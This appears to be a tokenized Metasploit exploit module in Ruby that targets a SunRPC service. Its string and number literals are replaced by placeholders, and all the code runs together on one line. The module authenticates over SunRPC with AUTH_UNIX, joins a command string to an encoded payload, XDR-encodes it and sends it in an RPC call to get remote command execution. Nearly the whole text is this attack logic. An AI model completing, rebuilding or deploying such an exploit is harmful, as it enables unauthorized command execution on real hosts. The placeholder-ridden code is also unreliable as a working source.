require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = ExcellentRanking include Msf :: Exploit :: Remote :: SunRPC def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > [ <str> ] , <str> = > MSF_LICENSE , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , ] , <str> = > true , <str> = > <str> , <str> = > ARCH_CMD , <str> = > { <str> = > <int> , <str> = > true , <str> = > { <str> = > <str> , <str> = > <str> , } } , <str> = > [ [ <str> , { } ] , ] , <str> = > <int> , <str> = > <str> ) ) register_options ( [ OptString . new ( <str> , [ false , <str> , <str> ] ) , OptInt . new ( <str> , [ false , <str> , <int> ] ) , OptInt . new ( <str> , [ false , <str> , <int> ] ) ] , self . class ) end def exploit hostname = datastore [ <str> ] program = <int> progver = <int> procedure = <int> print_status ( <str> ) pport = sunrpc_create ( <str> , program , progver ) print_status ( <str> payload . encoded <str> ) print_status ( <str> ) sunrpc_authunix ( hostname , datastore [ <str> ] , datastore [ <str> ] , [ ] ) command = <str> + payload . encoded msg = XDR . encode ( command , <int> , <hex> , <int> , <hex> ) sunrpc_call ( procedure , msg ) sunrpc_destroy print_status ( <str> ) rescue :: Rex :: Proto :: SunRPC :: RPCTimeout print_warning ( <str> + $! ) end end 
